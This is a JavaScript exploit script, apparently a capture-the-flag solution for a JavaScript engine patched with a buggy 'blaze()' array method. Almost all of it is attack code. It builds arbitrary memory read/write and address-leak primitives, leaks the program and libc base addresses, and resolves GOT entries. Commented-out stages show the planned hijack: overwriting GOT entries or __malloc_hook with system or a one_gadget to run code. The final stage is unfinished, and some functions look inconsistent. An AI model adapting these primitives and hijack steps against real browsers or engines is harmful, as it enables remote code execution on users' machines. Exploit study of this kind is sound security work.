load('utils.js');
load('int64.js');
load('resolver.js');
 
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function arb_read(addr, size) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	a1.blaze();

	a1[13] = itof(addr)
	return a2.slice(0, size);
}
/*
function arb_write(addr, value) {
	x = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
	y = new Uint8Array(8);
	x.blaze();
	save = x[13];
	x[13] = itof(addr)
	y[0] = value;
	x[13] = save;
}
*/
function arb_w8(addr, value) {
	var i;

	for (i = 0; i < 8; i ++) {
		v = BigInt(value & 0xff);
		arb_write(addr, v);
		value = value >> 8;
		addr += 1n;
	}
}

function arb_write(addr, value) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	
	a1[13] = itof(addr);
	a2.set(value);
}

function addrof(obj) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	a1.blaze();	
	a1[14] = obj;
	return a2.slice(0, 8);
}

var x1 = new Array(1, 2, 3, 4);
var x2 = new Uint8Array(8);
x1.blaze();

// This offset should be constant for patch level
let code_base = ftoi(x1[8]) - 0x110f6c8n;
console.log("[+] ELF image_base leaked:\t0x"+code_base.toString(16));

// JS resolver to get main image R_X86_64_JUMP_SLOT
image_got = get_got(code_base, R_X86_64_JUMP_SLOT);
/*
// Without FULL RELRO this may also work
 * let got_system = image_got['system'];
 * let got_fopen = image_got['fopen'];
 * let libc_system = arb_r8(got_system);
 * console.log("[+] GOT system at:\t\t0x"+got_system.toString(16));
 * console.log("[+] libc system at:\t\t0x"+libc_system.toString(16));
 * arb_w8(got_fopen, libc_system);
 * Math.atan2(x2);
 * load("/usr/bin/xcalc");
*/

let first_got_entry_addr = image_got["__cxa_finalize"];
let first_got_entry = Int64.fromJSValue(arb_read(first_got_entry_addr, 8));
console.log("[+] first GOT entry addr:\t0x"+first_got_entry_addr.toString(16));

// Resolving LIBC base
var libc_base = 0;
var libc_header = 0;
var delta = BigInt(0x1000 * 65);
first_got_entry_delta = first_got_entry % Math.pow(2,8);
first_got_entry = BigInt(first_got_entry - first_got_entry_delta);
console.log("[+] Attempting to find libc base");
console.log("\t- Starting from address: 0x" + (first_got_entry).toString(16));
for (var x=0; x < 10; x++) {
	delta = delta + 0x1000n;
	libc_header = arb_read(BigInt(first_got_entry-delta), 8);	
	if (Int64.fromJSValue(libc_header) == 0x102464c457f) {
		libc_base = BigInt(first_got_entry-delta);
		break;
	}
}

if (libc_base == 0) {
	console.log("[-] Failed to leak libc");
}
console.log("[+] libc base leaked:\t0x"+libc_base.toString(16));

// Resolving LIBC symbols
let libc_got = get_got(libc_base, R_X86_64_GLOB_DAT);
console.log("[+] libc __malloc_hook: 0x"+libc_got["__malloc_hook"].toString(16));
/*one_gadget = new Int64((libc_base + 0xe6c7en).toString(16));
Math.atan2(x1);

// havent figured out how to exploit libc's symbols yet TBC
// arb_write(libc_got["__malloc_hook"], one_gadget);
// Without FULL RELRO this may just work
// arb_write(image_got["gettimeofday"], one_gadget);
// Date.now();
*/
